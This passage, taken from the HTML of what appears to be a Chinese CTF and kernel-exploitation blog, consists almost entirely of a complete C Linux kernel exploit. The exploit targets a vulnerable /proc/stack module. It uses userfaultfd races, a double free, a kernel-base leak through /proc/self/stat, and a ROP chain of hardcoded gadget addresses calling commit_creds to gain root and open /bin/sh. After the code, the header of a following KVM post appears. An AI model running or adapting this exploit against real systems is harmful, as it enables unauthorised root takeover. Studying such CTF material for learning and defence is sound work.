class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x10_ret 0xffffffff815afc83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x38_ret 0xffffffff815b29f1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_pop_rbx_r12_r13_rbp_ret    0xffffffff8145523f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x1c8_pop_6_ret 0xffffffff814d51c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff815573b0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff81069c10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff81069e00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81034505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff810001cc</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81600a34+0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_pop_rbp_ret 0xffffffff8121f89a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax_pop_rbp_ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="keyword">int</span> stack_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line"><span class="keyword">size_t</span> kernel_msg;</span><br><span class="line"><span class="keyword">size_t</span> value;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> * msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(stack_fd,<span class="number">0x57AC0001</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(stack_fd,<span class="number">0x57AC0002</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">leak_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        del(&amp;kernel_msg);</span><br><span class="line">        kernel_base=kernel_msg<span class="number">-0x13be80</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*]kernel_base:%p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">doublefree_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        del(&amp;value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> stat_rop_fd=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">stat_rop_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">            close(seq_fd[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        mov_rdi_rax_pop_rbp_ret_addr=mov_rdi_rax_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        ret_addr=ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, mov_rdi_rax_pop_rbp_ret_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, commit_creds_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,    0x66666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, stat_rop_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">        usr_shell();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    stack_fd=open(<span class="string">&quot;/proc/stack&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!stack_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;/proc/stack open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        seq_fd[i]=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!seq_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;stat open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="keyword">char</span> *leak_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(leak_buf,page_size,leak_handler_thread);</span><br><span class="line">    <span class="keyword">int</span> seq_leak_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!seq_leak_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;leak_stat open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(seq_leak_fd);</span><br><span class="line">    add(leak_buf);</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;rootroot&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *doublefree_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(doublefree_buf,page_size,doublefree_handler_thread);</span><br><span class="line">    del(doublefree_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *stat_rop_buf=mmap(<span class="literal">NULL</span>,page_size*<span class="number">2</span>,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(stat_rop_buf+page_size,page_size,stat_rop_handler_thread);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stat_rop_buf+page_size<span class="number">-8</span>)=add_rsp_0x1c8_pop_6_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    stat_rop_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!stat_rop_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;stat_rop_fd open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;jingyinghua&quot;</span>, stat_rop_buf + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>






























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/14/KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%A4%8D%E7%8E%B0ACTF-mykvm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/14/KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%A4%8D%E7%8E%B0ACTF-mykvm/" class="post-title-link" itemprop="url">KVM虚拟化学习&复现ACTF mykvm</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-14 21:42:19" itemprop="dateCreated datePublished" datetime="2022-07-14T21:42:19+08:00">2022-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-19 01:12:30" itemprop="dateModified" datetime="2022-07-19T01:12:30+08:00">2022-07-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
